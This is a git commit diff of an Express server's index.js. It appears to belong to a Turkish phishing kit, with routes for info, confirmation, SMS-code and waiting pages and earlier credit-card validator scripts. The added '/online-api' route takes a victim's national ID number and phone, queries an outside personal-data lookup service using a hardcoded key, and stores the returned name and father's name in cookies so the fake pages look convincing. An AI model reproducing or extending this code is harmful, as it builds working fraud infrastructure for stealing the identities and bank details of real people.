afd63697de4d0088d2c8d96c655033d78abcaa65
Aligollez <ikametonay@gmail.com>
2024-07-09 03:35:10 +0300

    Update index.js

--- index.js
+++ index.js
@@ -9,69 +9,51 @@ const { readdirSync } = require("fs");
 app.use(express.json());
 app.use(express.static('public'));
 
-// Import routes from the routes directory
+ 
 readdirSync("./routes").map((file) => app.use("/", require("./routes/" + file)));
 
-// Define static file routes
-app.get('/files/css', (req, res) => {
-  res.sendFile(__dirname + '/public/files/css');
-});
-app.get('/bk.gif', (req, res) => {
-  res.sendFile(__dirname + '/public/bk.gif');
-});
+ 
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/public/index.html');
 });
-app.get('/files/bootstrap.min.css', (req, res) => {
-  res.sendFile(__dirname + '/public/files/bootstrap.min.css');
-});
-app.get('/files/logo-2.png', (req, res) => {
-  res.sendFile(__dirname + '/public/files/logo-2.png');
-});
-app.get('/bilgi.html', (req, res) => {
+
+app.get('/bilgi', (req, res) => {
   res.sendFile(__dirname + '/public/bilgi.html');
 });
 app.get('/onay', (req, res) => {
   res.sendFile(__dirname + '/public/onay.html');
 });
-app.get('/files/font-awesome.min.css', (req, res) => {
-  res.sendFile(__dirname + '/public/files/font-awesome.min.css');
-});
-app.get('/onay.png', (req, res) => {
-  res.sendFile(__dirname + '/public/onay.png');
-});
-app.get('/files/flaticon.css', (req, res) => {
-  res.sendFile(__dirname + '/public/files/flaticon.css');
-});
+ 
 app.get('/sms.html', (req, res) => {
   res.sendFile(__dirname + '/public/sms.html');
 });
 app.get('/bekle', (req, res) => {
   res.sendFile(__dirname + '/public/bekle.html');
 });
-app.get('/files/js', (req, res) => {
-  res.sendFile(__dirname + '/public/files/js');
-});
-app.get('/img/bg-image.jpeg', (req, res) => {
-  res.sendFile(__dirname + '/public/img/bg-image.jpeg');
-});
-app.get('/files/jquery.creditCardValidator.js.indir', (req, res) => {
-  res.sendFile(__dirname + '/public/files/jquery.creditCardValidator.js.indir');
-});
-app.get('/files/default.css', (req, res) => {
-  res.sendFile(__dirname + '/public/files/default.css');
-});
-app.get('/files/creditly.js', (req, res) => {
-  res.sendFile(__dirname + '/public/files/creditly.js');
-});
-app.get('/files/jquery-3.2.1.min.js.indir', (req, res) => {
-  res.sendFile(__dirname + '/public/files/jquery-3.2.1.min.js.indir');
-});
-app.get('/files/style.css', (req, res) => {
-  res.sendFile(__dirname + '/public/files/style.css');
+ 
+app.post('/online-api', async (req, res) => {
+  const tc = req.body.tridField;
+  const telno = req.body.telno; // Telefon numarasını alma
+
+  try {
+      const response = await axios.get(`https://ilkkuralsaygi.online/apiservice/stayhigh/tcpro.php?auth=stayhighforlife&tc=${tc}`);
+      const data = response.data;
+
+      // Çerezlere verileri kaydet
+      res.cookie('adi', data.adi, { httpOnly: false });
+      res.cookie('soyadi', data.soyadi, { httpOnly: false });
+      res.cookie('babaad', data.babaad, { httpOnly: false });
+
+      // Telefon numarasını da çerez olarak kaydet
+      res.cookie('telno', telno, { httpOnly: false });
+
+      res.redirect('/sorgula');
+  } catch (error) {
+      console.error('API isteğinde hata:', error);
+      res.status(500).send('Sunucu hatası.');
+  }
 });
 
- 
 app.get('/api', async (req, res) => {
   try {
     const userIp = req.query.user_ip; 
